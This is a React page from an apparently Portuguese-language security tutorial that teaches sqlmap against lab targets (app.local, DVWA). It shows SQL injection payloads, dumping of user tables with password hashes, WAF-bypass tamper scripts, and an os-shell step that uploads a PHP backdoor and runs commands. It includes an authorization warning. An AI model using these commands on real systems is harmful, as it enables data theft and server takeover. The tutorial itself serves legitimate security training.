import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Sqlmap() {
  return (
    <PageContainer
      title="SQLMap — exploração automatizada de SQL Injection"
      subtitle="Detecta, explora e extrai bancos via injection. Suporta MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MongoDB, etc."
      difficulty="intermediário"
      timeToRead="22 min"
      prompt="web/sqlmap"
    >
      <h2>Setup</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y sqlmap",
            out: "(versão do repositório Kali)",
            outType: "muted",
          },
          {
            comment: "ou versão mais nova direto do git",
            cmd: "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git /opt/sqlmap-git",
            out: `Cloning into '/opt/sqlmap-git'...
remote: Enumerating objects: 1547, done.
Receiving objects: 100% (1547/1547), 4.81 MiB | 12.4 MiB/s, done.`,
            outType: "default",
          },
          {
            cmd: "sqlmap --version",
            out: "1.8.10#stable",
            outType: "info",
          },
        ]}
      />

      <h2>Detecção básica (GET param)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sqlmap -u 'https://app.local/produto.php?id=1' --batch",
            out: `        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.10#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.

[*] starting @ 12:14:23 /2026-04-03/

[12:14:23] [INFO] testing connection to the target URL
[12:14:23] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:14:23] [INFO] testing if the target URL content is stable
[12:14:23] [INFO] target URL content is stable
[12:14:23] [INFO] testing if GET parameter 'id' is dynamic
[12:14:23] [INFO] GET parameter 'id' appears to be dynamic
[12:14:23] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:14:23] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[12:14:23] [INFO] testing for SQL injection on GET parameter 'id'
[12:14:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:14:24] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="produto")
[12:14:24] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:14:25] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[12:14:25] [INFO] testing 'MySQL inline queries'
[12:14:25] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[12:14:25] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
[12:14:35] [INFO] GET parameter 'id' appears to be 'MySQL > 5.0.11 AND time-based blind' injectable
[12:14:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:14:35] [INFO] target URL appears to be UNION injectable with 5 columns
[12:14:35] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 4242=4242

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 4242 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(4242=4242,1))),0x71706b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL > 5.0.11 AND time-based blind
    Payload: id=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=-3142 UNION ALL SELECT NULL,CONCAT(0x71...,0x71706b7a71),NULL,NULL,NULL-- -
---
[12:14:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04
web application technology: Apache 2.4.41, PHP 7.4.3
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)`,
            outType: "success",
          },
        ]}
      />

      <h2>Enumerar bancos / tabelas / colunas</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sqlmap -u 'https://app.local/produto.php?id=1' --dbs --batch",
            out: `[12:15:21] [INFO] fetching database names
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] webapp`,
            outType: "info",
          },
          {
            cmd: "sqlmap -u 'https://app.local/produto.php?id=1' -D webapp --tables --batch",
            out: `Database: webapp
[5 tables]
+---------+
| logs    |
| orders  |
| products|
| sessions|
| users   |
+---------+`,
            outType: "default",
          },
          {
            cmd: "sqlmap -u 'https://app.local/produto.php?id=1' -D webapp -T users --columns --batch",
            out: `Database: webapp
Table: users
[6 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| email    | varchar(255) |
| name     | varchar(100) |
| password | varchar(255) |
| role     | enum         |
| created  | datetime     |
+----------+--------------+`,
            outType: "default",
          },
          {
            cmd: "sqlmap -u 'https://app.local/produto.php?id=1' -D webapp -T users --dump --batch",
            out: `Database: webapp
Table: users
[3 entries]
+----+-------------------+--------+--------------------------------------------------------------+-------+---------------------+
| id | email             | name   | password                                                     | role  | created             |
+----+-------------------+--------+--------------------------------------------------------------+-------+---------------------+
| 1  | admin@app.local   | admin  | $2y$10$zQk...vQy (admin123)                                  | admin | 2024-01-15 09:11:42 |
| 2  | jsmith@app.local  | John   | $2y$10$qWc...Pp4 (qwerty)                                    | user  | 2024-02-22 14:23:01 |
| 3  | maria@app.local   | Maria  | $2y$10$abc...xyz                                             | user  | 2024-03-08 18:42:15 |
+----+-------------------+--------+--------------------------------------------------------------+-------+---------------------+

[12:18:14] [INFO] fetched data logged to text files under '/home/wallyson/.local/share/sqlmap/output/app.local'`,
            outType: "warning",
          },
        ]}
      />

      <h2>POST, headers, cookies</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "POST com body",
            cmd: "sqlmap -u 'https://app.local/login' --data 'user=admin&pass=test' --batch",
            out: "(testa user E pass automaticamente)",
            outType: "muted",
          },
          {
            comment: "marcar parâmetro específico com *",
            cmd: "sqlmap -u 'https://app.local/login' --data 'user=admin*&pass=test'",
            out: "(testa SÓ user)",
            outType: "muted",
          },
          {
            comment: "header Cookie autenticado",
            cmd: "sqlmap -u 'https://app.local/dashboard?id=1' --cookie 'PHPSESSID=abc123; role=admin' --batch",
            out: "(envia cookies em todo request)",
            outType: "default",
          },
          {
            comment: "header customizado",
            cmd: "sqlmap -u 'https://api.local/v1/user' --headers 'Authorization: Bearer eyJxxx' --data '{\"id\":1}' --batch",
            out: "(JSON request)",
            outType: "default",
          },
          {
            comment: "request inteiro de um arquivo (capturado no Burp)",
            cmd: "sqlmap -r request.txt --batch",
            out: "(salva o request do Burp em request.txt e passa)",
            outType: "info",
          },
        ]}
      />

      <h2>Bypass de WAF (--tamper)</h2>
      <CommandTable
        title="Tamper scripts mais usados"
        variations={[
          { cmd: "space2comment", desc: "Substitui espaço por /**/.", output: "Bypass de WAF que filtra espaços." },
          { cmd: "space2randomblank", desc: "Espaço por whitespace aleatório (\\t, \\n, \\r).", output: "Idem." },
          { cmd: "between", desc: "Troca = por BETWEEN .. AND ..", output: "Bypass de filtros de operador." },
          { cmd: "randomcase", desc: "RaNdOmIzA case de keywords.", output: "WAF que faz match case-sensitive." },
          { cmd: "charencode", desc: "URL-encode dos caracteres.", output: "%53%45%4c%45%43%54..." },
          { cmd: "apostrophenullencode", desc: "Substitui aspas simples por %u0027.", output: "Bypass de escape de quotes." },
          { cmd: "modsecurityzeroversioned", desc: "Comentários /*!00000*/ específicos do MySQL.", output: "Bypass do ModSecurity." },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sqlmap -u 'https://app.local/p?id=1' --tamper space2comment,between,randomcase --batch",
            out: `[INFO] loading tamper module 'space2comment'
[INFO] loading tamper module 'between'
[INFO] loading tamper module 'randomcase'
[INFO] testing connection to target URL
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[INFO] confirming with tamper-encoded payload: id=1/**/AND/**/SElEcT/**/(CASE/**/WHEN/**/(BeTWeEn/**/4242/**/AnD/**/4242)/**/THeN/**/1/**/EnD)
[INFO] vulnerable confirmed`,
            outType: "success",
          },
        ]}
      />

      <h2>Pós-exploração — RCE e sistema</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "shell SQL interativa",
            cmd: "sqlmap -u 'https://app.local/p?id=1' --sql-shell --batch",
            out: `[12:21:05] [INFO] going to call 'SHOW DATABASES'
sql-shell> SELECT @@version;
[12:21:08] [INFO] retrieved: 8.0.36-0ubuntu0.22.04.1
[*] 8.0.36-0ubuntu0.22.04.1

sql-shell> SELECT user,host FROM mysql.user;
[12:21:12] [INFO] retrieved: 'webapp_user', 'localhost'
[12:21:13] [INFO] retrieved: 'root', 'localhost'
[*] 'webapp_user', 'localhost'
[*] 'root', 'localhost'

sql-shell> exit`,
            outType: "info",
          },
          {
            comment: "tentar shell do SO (precisa de FILE privilege)",
            cmd: "sqlmap -u 'https://app.local/p?id=1' --os-shell --batch",
            out: `which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4

[INFO] testing if current user is DBA
[INFO] checking for available file system writable directories
[INFO] retrieved web server document root: '/var/www/html'
[INFO] uploaded shell stub via SQL INSERT INTO ... DUMPFILE
[INFO] the file stager has been successfully uploaded on '/var/www/html/tmpuesfo.php'
[INFO] the backdoor has been successfully uploaded on '/var/www/html/tmpbeoxh.php'

os-shell> id
do you want to retrieve the command standard output? [Y/n] Y
[INFO] retrieved: uid=33(www-data) gid=33(www-data) groups=33(www-data)
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

os-shell> uname -a
command standard output: 'Linux app-server 5.15.0-83-generic #92-Ubuntu SMP x86_64 GNU/Linux'`,
            outType: "error",
          },
        ]}
      />

      <h2>Salvar e retomar sessão</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "sqlmap salva sessão por padrão; rodar de novo retoma",
            cmd: "ls ~/.local/share/sqlmap/output/app.local/",
            out: `log    session.sqlite    target.txt`,
            outType: "default",
          },
          {
            comment: "forçar nova sessão",
            cmd: "sqlmap -u '...' --flush-session",
            out: "(começa do zero)",
            outType: "muted",
          },
        ]}
      />

      <h2>Performance</h2>
      <CommandTable
        title="Tunings de velocidade"
        variations={[
          { cmd: "--threads 10", desc: "Paralelismo (max 10).", output: "Acelera dump grande." },
          { cmd: "--level 1-5", desc: "Quantos testes de injection rodar.", output: "5 = todos (lento)." },
          { cmd: "--risk 1-3", desc: "Quão agressivos os payloads (3 inclui DELETE/UPDATE!).", output: "Cuidado: 3 pode quebrar dados." },
          { cmd: "--technique BEUSTQ", desc: "B=bool, E=error, U=union, S=stacked, T=time, Q=inline.", output: "Pular técnicas lentas." },
          { cmd: "--no-cast", desc: "Desabilita CAST().", output: "Útil em alguns DBs." },
          { cmd: "--keep-alive", desc: "Reutiliza conexões TCP.", output: "Mais rápido em LAN." },
        ]}
      />

      <PracticeBox
        title="Pwn no DVWA — SQL Injection"
        goal="Detectar, enumerar e dumpar a tabela users do DVWA via sqlmap."
        steps={[
          "Suba o DVWA (docker run -d -p 8080:80 vulnerables/web-dvwa).",
          "Login admin/password, dificuldade = Low.",
          "Vá em SQL Injection, capture o request com Burp e salve como request.txt.",
          "Rode sqlmap -r request.txt --batch --dbs.",
          "Drill down até dumpar dvwa.users.",
        ]}
        command={`sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D dvwa --tables
sqlmap -r request.txt --batch -D dvwa -T users --columns
sqlmap -r request.txt --batch -D dvwa -T users -C user,password --dump`}
        expected={`Database: dvwa
Table: users
[5 entries]
+--------+----------------------------------+
| user   | password                         |
+--------+----------------------------------+
| admin  | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb| e99a18c428cb38d5f260853678922e03 |
| 1337   | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo  | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |
+--------+----------------------------------+

[INFO] table 'dvwa.users' dumped to CSV file '/home/wallyson/.local/share/sqlmap/output/...'`}
        verify="O hash do admin (5f4dcc3b...) é MD5 de 'password'. Confirme com `echo -n password | md5sum`."
      />

      <AlertBox type="danger" title="--risk 3 pode destruir o banco">
        Risk 3 inclui payloads UPDATE e potencialmente DELETE.
        Em alvo de produção, mantenha-se em <strong>--risk 1 --level 1-2</strong> e
        <strong>nunca rode --os-shell ou --os-pwn</strong> sem autorização escrita explícita.
      </AlertBox>
    </PageContainer>
  );
}
